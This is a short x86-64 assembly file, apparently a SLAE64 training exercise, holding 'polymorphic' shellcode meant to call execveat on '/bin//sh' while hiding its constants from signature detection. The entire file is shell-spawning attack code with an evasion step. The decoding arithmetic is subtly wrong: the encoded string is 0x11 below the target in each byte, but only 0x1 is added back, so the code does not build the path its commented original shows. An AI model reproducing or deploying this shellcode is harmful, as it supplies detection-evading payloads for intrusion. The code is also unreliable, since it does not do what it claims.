; Filename: shellcode1-polymorphic.nasm
; Author: SLAE64-14209

global _start
section .text  
_start:

	;push 0x42 
	;pop rax
	sub rax, rax
	add rax, 0x11
	add rax, 0x31
	push rax
	inc ah
	cqo
	push rdx
	;mov rdi, 0x68732f2f6e69622f
	mov rdi, 0x57621E1E5D58511E
	add rdi, 0x1
	push rdi 
	push rsp
	pop rsi
	mov r8, rdx 
	mov r10, rdx 
  	syscall
